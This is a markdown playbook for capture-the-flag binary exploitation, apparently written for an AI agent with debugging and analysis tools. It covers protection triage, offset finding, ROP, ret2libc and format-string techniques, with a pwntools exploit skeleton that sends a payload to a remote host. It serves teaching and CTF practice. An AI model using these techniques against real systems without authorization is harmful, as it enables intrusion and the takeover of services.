# Binary Exploitation (pwn) Methodology
## Expert Playbook for Memory-Corruption Challenges

> Read the protections, find the primitive, build the exploit incrementally
> (local first, then remote) with pwntools.

---

## Phase 1: Triage

### 1.1 Protections (use the `pwn_template` tool)
```bash
pwn checksec ./chall        # or rabin2 -I ./chall
file ./chall
```
- **NX** on → no shellcode on stack → ROP / ret2libc.
- **PIE** on → need a leak for code addresses.
- **Canary** → need a leak or an overwrite path that preserves it.
- **RELRO** partial/none → GOT overwrite may be viable.

### 1.2 Surface (use the `radare2_analyze` tool)
```bash
r2 -q -c 'aaa; afl; iI; izq' ./chall
```
- Note dangerous calls: `gets`, `strcpy`, `sprintf`, `read` with big sizes,
  format-string `printf(user)`.
- Locate a `win`/`system`/`/bin/sh` gift if present.

---

## Phase 2: Find the Primitive

### 2.1 Offset (use the `gdb_debug` tool)
```bash
gdb --batch -nx -ex 'run <<< $(python3 -c "print(\"A\"*200)")' -ex 'info registers' ./chall
```
- Use a cyclic pattern; read the offset from the crashing RIP/EIP:
```python
cyclic(200); cyclic_find(0x6161616c)
```

### 2.2 Classify the technique
- **ret2win**: overwrite return address with the win function.
- **ret2libc / ROP**: leak libc (puts@got), compute base, call `system("/bin/sh")`.
- **format string**: leak stack/canary/libc, then arbitrary write (`%n`).
- **shellcode**: only when NX is off and a buffer is executable.

---

## Phase 3: Build the Exploit
```python
from pwn import *
context.binary = elf = ELF('./chall')
io = remote('host', 1337)          # or process('./chall')
offset = 40
rop = ROP(elf)
payload = flat({offset: [rop.find_gadget(['ret'])[0], elf.sym['win']]})
io.sendline(payload)
io.interactive()
```
- Start local; only swap to `remote()` once it works.
- For remote libc, use the exact libc (leak + libc-database / provided .so).

---

## Common Failure Modes & Solutions
| Problem | Solution |
|---------|----------|
| Works locally, fails remote | Match remote libc; align stack (extra `ret`) |
| `system` segfaults | 16-byte stack alignment (`ret` gadget) before call |
| Canary crash | Leak the canary first, place it back in the payload |
| PIE addresses wrong | Leak a code/libc pointer before using absolute addresses |

## Success Criteria
- [ ] Protections + offset documented
- [ ] Technique chosen from the protections
- [ ] Exploit returns a shell / flag reliably against the target
